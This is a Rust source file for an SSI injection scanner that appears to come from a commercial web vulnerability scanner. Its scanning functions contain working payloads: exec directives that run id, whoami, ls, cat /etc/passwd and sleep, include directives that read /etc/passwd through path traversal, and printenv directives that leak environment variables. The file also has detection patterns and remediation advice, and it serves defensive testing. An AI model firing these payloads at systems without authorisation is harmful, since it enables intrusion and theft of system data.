// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

use crate::http_client::HttpClient;
use crate::scanners::parameter_filter::{ParameterFilter, ScannerType};
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use std::sync::Arc;
use std::time::Instant;
use tracing::{debug, info};

pub struct SSIInjectionScanner {
    http_client: Arc<HttpClient>,
    test_marker: String,
}

impl SSIInjectionScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        // Generate unique test marker
        let test_marker = format!("ssi_{}", uuid::Uuid::new_v4().to_string().replace("-", ""));
        Self {
            http_client,
            test_marker,
        }
    }

    /// Scan endpoint for SSI injection vulnerabilities
    pub async fn scan(
        &self,
        url: &str,
        _config: &ScanConfig,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        info!("Testing SSI injection vulnerabilities");

        // Test SSI command execution
        let (vulns, tests) = self.test_ssi_exec(url).await?;
        vulnerabilities.extend(vulns);
        tests_run += tests;

        // Test SSI file inclusion
        if vulnerabilities.is_empty() {
            let (vulns, tests) = self.test_ssi_include(url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;
        }

        // Test SSI environment variables
        if vulnerabilities.is_empty() {
            let (vulns, tests) = self.test_ssi_env_vars(url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;
        }

        // Test time-based SSI injection
        if vulnerabilities.is_empty() {
            let (vulns, tests) = self.test_time_based_ssi(url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test SSI command execution
    async fn test_ssi_exec(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 5;

        // Smart parameter filtering - skip framework internals
        if ParameterFilter::should_skip_parameter("comment", ScannerType::Other) {
            debug!("[SSI] Skipping framework/internal parameter: comment");
            return Ok((Vec::new(), 0));
        }

        info!("[SSI] Testing SSI command execution (priority: {})",
              ParameterFilter::get_parameter_priority("comment"));

        let payloads = vec![
            format!(r#"<!--#exec cmd="echo {}" -->"#, self.test_marker),
            r#"<!--#exec cmd="id" -->"#.to_string(),
            r#"<!--#exec cmd="whoami" -->"#.to_string(),
            r#"<!--#exec cmd="ls" -->"#.to_string(),
            r#"<!--#exec cmd="cat /etc/passwd" -->"#.to_string(),
        ];

        for payload in payloads {
            let test_url = if url.contains('?') {
                format!("{}&comment={}", url, urlencoding::encode(&payload))
            } else {
                format!("{}?comment={}", url, urlencoding::encode(&payload))
            };

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if self.detect_ssi_exec(&response.body) {
                        info!("SSI command execution detected");
                        vulnerabilities.push(self.create_vulnerability(
                            url,
                            "SSI Command Execution",
                            &payload,
                            "Server-Side Includes allow command execution",
                            &format!("SSI marker '{}' or command output detected", self.test_marker),
                            Severity::Critical,
                        ));
                        break;
                    }
                }
                Err(e) => {
                    debug!("Request failed: {}", e);
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test SSI file inclusion
    async fn test_ssi_include(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 3;

        debug!("Testing SSI file inclusion");

        let payloads = vec![
            r#"<!--#include virtual="/etc/passwd" -->"#.to_string(),
            r#"<!--#include file="/etc/passwd" -->"#.to_string(),
            r#"<!--#include virtual="../../../etc/passwd" -->"#.to_string(),
        ];

        for payload in payloads {
            let test_url = if url.contains('?') {
                format!("{}&comment={}", url, urlencoding::encode(&payload))
            } else {
                format!("{}?comment={}", url, urlencoding::encode(&payload))
            };

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if self.detect_ssi_include(&response.body) {
                        info!("SSI file inclusion detected");
                        vulnerabilities.push(self.create_vulnerability(
                            url,
                            "SSI File Inclusion",
                            &payload,
                            "Server-Side Includes allow file inclusion",
                            "SSI file inclusion detected (/etc/passwd content)",
                            Severity::High,
                        ));
                        break;
                    }
                }
                Err(e) => {
                    debug!("Request failed: {}", e);
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test SSI environment variable disclosure
    async fn test_ssi_env_vars(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 4;

        debug!("Testing SSI environment variable disclosure");

        let payloads = vec![
            r#"<!--#echo var="DOCUMENT_ROOT" -->"#.to_string(),
            r#"<!--#echo var="SERVER_NAME" -->"#.to_string(),
            r#"<!--#echo var="HTTP_USER_AGENT" -->"#.to_string(),
            r#"<!--#printenv -->"#.to_string(),
        ];

        for payload in payloads {
            let test_url = if url.contains('?') {
                format!("{}&comment={}", url, urlencoding::encode(&payload))
            } else {
                format!("{}?comment={}", url, urlencoding::encode(&payload))
            };

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if self.detect_ssi_env_vars(&response.body) {
                        info!("SSI environment variable disclosure detected");
                        vulnerabilities.push(self.create_vulnerability(
                            url,
                            "SSI Environment Variable Disclosure",
                            &payload,
                            "Server-Side Includes expose environment variables",
                            "Environment variables disclosed via SSI",
                            Severity::Medium,
                        ));
                        break;
                    }
                }
                Err(e) => {
                    debug!("Request failed: {}", e);
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test time-based SSI injection
    async fn test_time_based_ssi(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 1;

        debug!("Testing time-based SSI injection");

        let payload = r#"<!--#exec cmd="sleep 5" -->"#;
        let test_url = if url.contains('?') {
            format!("{}&comment={}", url, urlencoding::encode(payload))
        } else {
            format!("{}?comment={}", url, urlencoding::encode(payload))
        };

        let start = Instant::now();
        match self.http_client.get(&test_url).await {
            Ok(_response) => {
                let elapsed = start.elapsed().as_secs_f64();

                // If response took 4+ seconds, likely SSI injection
                if elapsed >= 4.0 {
                    info!("Time-based SSI injection detected ({}s delay)", elapsed);
                    vulnerabilities.push(self.create_vulnerability(
                        url,
                        "SSI Command Execution (Time-based)",
                        payload,
                        "SSI command execution detected via time delay",
                        &format!("Response delayed by {:.2}s indicating SSI execution", elapsed),
                        Severity::Critical,
                    ));
                }
            }
            Err(e) => {
                debug!("Request failed: {}", e);
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Detect SSI command execution
    fn detect_ssi_exec(&self, body: &str) -> bool {
        // Check for test marker
        if body.contains(&self.test_marker) {
            return true;
        }

        // Check for command output indicators
        let indicators = vec![
            "uid=",
            "gid=",
            "root:",
            "bin:",
            "daemon:",
            "/bin/bash",
            "/bin/sh",
        ];

        for indicator in indicators {
            if body.contains(indicator) {
                return true;
            }
        }

        false
    }

    /// Detect SSI file inclusion
    fn detect_ssi_include(&self, body: &str) -> bool {
        // Check for /etc/passwd content
        let passwd_indicators = vec![
            "root:x:",
            "daemon:x:",
            "bin:x:",
            "nobody:x:",
        ];

        for indicator in passwd_indicators {
            if body.contains(indicator) {
                return true;
            }
        }

        false
    }

    /// Detect SSI environment variable disclosure
    fn detect_ssi_env_vars(&self, body: &str) -> bool {
        let env_indicators = vec![
            "DOCUMENT_ROOT=",
            "SERVER_NAME=",
            "HTTP_USER_AGENT=",
            "GATEWAY_INTERFACE=",
            "SERVER_SOFTWARE=",
            "REMOTE_ADDR=",
        ];

        for indicator in env_indicators {
            if body.contains(indicator) {
                return true;
            }
        }

        false
    }

    /// Create a vulnerability record
    fn create_vulnerability(
        &self,
        url: &str,
        attack_type: &str,
        payload: &str,
        description: &str,
        evidence: &str,
        severity: Severity,
    ) -> Vulnerability {
        let cvss = match severity {
            Severity::Critical => 9.8,
            Severity::High => 8.6,
            Severity::Medium => 6.5,
            _ => 4.3,
        };

        Vulnerability {
            id: format!("ssi_{}", uuid::Uuid::new_v4().to_string()),
            vuln_type: format!("SSI Injection ({})", attack_type),
            severity,
            confidence: Confidence::High,
            category: "Injection".to_string(),
            url: url.to_string(),
            parameter: Some("comment".to_string()),
            payload: payload.to_string(),
            description: description.to_string(),
            evidence: Some(evidence.to_string()),
            cwe: "CWE-97".to_string(),
            cvss: cvss as f32,
            verified: true,
            false_positive: false,
            remediation: "1. Disable Server-Side Includes if not needed\n\
                         2. Validate and sanitize all user input before processing\n\
                         3. Use allowlists for acceptable SSI commands\n\
                         4. Disable SSI exec command: Options -Includes +IncludesNOEXEC\n\
                         5. Escape SSI special characters (<!-- -->)\n\
                         6. Use modern templating engines instead of SSI\n\
                         7. Implement strict file path validation for includes\n\
                         8. Run web server with minimal privileges\n\
                         9. Monitor for suspicious SSI directive usage\n\
                         10. Consider Content Security Policy to prevent injection".to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
        }
    }
}

// UUID generation helper
mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> Self {
            Uuid
        }

        pub fn to_string(&self) -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}{:04x}{:04x}{:04x}{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::detection_helpers::AppCharacteristics;
use crate::http_client::HttpClient;
    use std::sync::Arc;

    fn create_test_scanner() -> SSIInjectionScanner {
        let http_client = Arc::new(HttpClient::new(30, 3).unwrap());
        SSIInjectionScanner::new(http_client)
    }

    #[test]
    fn test_detect_ssi_exec_marker() {
        let scanner = create_test_scanner();
        let body = format!("Response contains {}", scanner.test_marker);

        assert!(scanner.detect_ssi_exec(&body));
    }

    #[test]
    fn test_detect_ssi_exec_output() {
        let scanner = create_test_scanner();

        let bodies = vec![
            "uid=1000(user) gid=1000(user)",
            "root:x:0:0:root:/root:/bin/bash",
            "daemon:x:1:1:daemon:/usr/sbin:/bin/sh",
        ];

        for body in bodies {
            assert!(scanner.detect_ssi_exec(body));
        }
    }

    #[test]
    fn test_detect_ssi_include() {
        let scanner = create_test_scanner();

        assert!(scanner.detect_ssi_include("root:x:0:0:root:/root:/bin/bash"));
        assert!(scanner.detect_ssi_include("daemon:x:1:1:daemon"));
        assert!(scanner.detect_ssi_include("nobody:x:65534:65534:nobody"));
    }

    #[test]
    fn test_detect_ssi_env_vars() {
        let scanner = create_test_scanner();

        assert!(scanner.detect_ssi_env_vars("DOCUMENT_ROOT=/var/www/html"));
        assert!(scanner.detect_ssi_env_vars("SERVER_NAME=example.com"));
        assert!(scanner.detect_ssi_env_vars("HTTP_USER_AGENT=Mozilla/5.0"));
    }

    #[test]
    fn test_no_false_positives() {
        let scanner = create_test_scanner();
        let body = "Normal response without SSI execution";

        assert!(!scanner.detect_ssi_exec(body));
        assert!(!scanner.detect_ssi_include(body));
        assert!(!scanner.detect_ssi_env_vars(body));
    }

    #[test]
    fn test_create_vulnerability() {
        let scanner = create_test_scanner();

        let vuln = scanner.create_vulnerability(
            "http://example.com",
            "SSI Command Execution",
            r#"<!--#exec cmd="id" -->"#,
            "SSI command execution detected",
            "uid=1000 detected",
            Severity::Critical,
        );

        assert_eq!(vuln.vuln_type, "SSI Injection (SSI Command Execution)");
        assert_eq!(vuln.severity, Severity::Critical);
        assert_eq!(vuln.cwe, "CWE-97");
        assert_eq!(vuln.cvss, 9.8);
        assert!(vuln.verified);
    }

    #[test]
    fn test_unique_test_marker() {
        let scanner1 = create_test_scanner();
        let scanner2 = create_test_scanner();

        assert_ne!(scanner1.test_marker, scanner2.test_marker);
        assert!(scanner1.test_marker.starts_with("ssi_"));
    }
}
